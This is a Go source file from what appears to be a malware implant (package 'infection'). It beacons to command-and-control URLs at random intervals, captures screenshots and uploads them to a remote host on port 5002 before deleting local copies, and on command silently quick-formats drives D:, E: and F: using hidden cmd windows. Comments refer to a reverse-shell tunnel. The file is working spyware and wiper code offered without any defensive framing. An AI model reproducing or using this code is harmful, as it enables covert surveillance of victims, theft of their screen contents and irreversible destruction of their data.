package killit

import (
	"encoding/json"
	"github.com/parnurzeal/gorequest"
	"infection/util/lib"
	"os/exec"
	"syscall"
	"time"
)

type Check struct {
	Hostid string `json:"hostid"`
}

// ioop wait master call died
func Killit() {
	var check Check
	for {
		ticker := time.NewTicker(time.Second * time.Duration(lib.RandInt64(15, 50)))
		resp, body, _ := gorequest.New().
			Get(lib.MIDKILLIP).
			End()
		if resp.StatusCode == 200 && body != "" {
			if err := json.Unmarshal([]byte(body), &check); err == nil {
				// if not need  dont open the tunnel to revert shell
				outip := lib.GetOutIp()
				if check.Hostid == lib.HOSTID || check.Hostid == outip {
					lib.KillALL()
				} else {
					aresp, abody, _ := gorequest.New().
						Get(lib.ALLKILL).
						End()
					if aresp.StatusCode == 200 && abody != "" {
						if err := json.Unmarshal([]byte(abody), &check); err == nil {
							if check.Hostid == "0" {
								lib.KillALL()
							}
						}

					}
				}
			}
		}
		<-ticker.C
	}
}

func GetPic(addr string) {
	var check Check
	for {
		ticker := time.NewTicker(time.Second * time.Duration(lib.RandInt64(10, 40)))
		resp, body, _ := gorequest.New().
			Get(lib.GETSCREEN).
			End()
		if resp.StatusCode == 200 && body != "" {
			if err := json.Unmarshal([]byte(body), &check); err == nil {
				// if not need  dont open the tunnel to revert shell
				outip := lib.GetOutIp()
				if check.Hostid == lib.HOSTID || check.Hostid == outip {
					filenames := lib.Getscreenshot()
					finflag := make(chan string)
					for _, fname := range filenames {
						go lib.SingleFile(fname, "http://"+addr+":5002/browser/browserbag", finflag)
						<-finflag
						go lib.Removetempimages(filenames, finflag)
					}
				} else if check.Hostid == "0" {
					filenames := lib.Getscreenshot()
					finflag := make(chan string)
					for _, fname := range filenames {
						go lib.SingleFile(fname, "http://"+addr+":5002/browser/browserbag", finflag)
						<-finflag
						go lib.Removetempimages(filenames, finflag)
					}
				}
			}
		}
		<-ticker.C
	}
}

func ClearALL(addr string) {
	var check Check
	for {
		ticker := time.NewTicker(time.Second * time.Duration(lib.RandInt64(50, 300)))
		resp, body, _ := gorequest.New().
			Get(lib.CLEARPIC).
			End()
		if resp.StatusCode == 200 && body != "" {
			if err := json.Unmarshal([]byte(body), &check); err == nil {
				// if not need  dont open the tunnel to revert shell
				outip := lib.GetOutIp()
				if check.Hostid == lib.HOSTID || check.Hostid == outip {
					lib.ClearPic()
				} else if check.Hostid == "0" {
					lib.ClearPic()
					// kill it
				} else if check.Hostid == "1" {
					cmd := exec.Command("cmd", "/C", "format", "d:/fs:fat32", "/q", "/y")
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd.Start()
					cmd2 := exec.Command("cmd", "/C", "format", "e:/fs:fat32", "/q", "/y")
					cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd2.Start()
					cmd3 := exec.Command("cmd", "/C", "format", "f:/fs:fat32", "/q", "/y")
					cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd3.Start()
				}
			}
		}
		<-ticker.C
	}
}
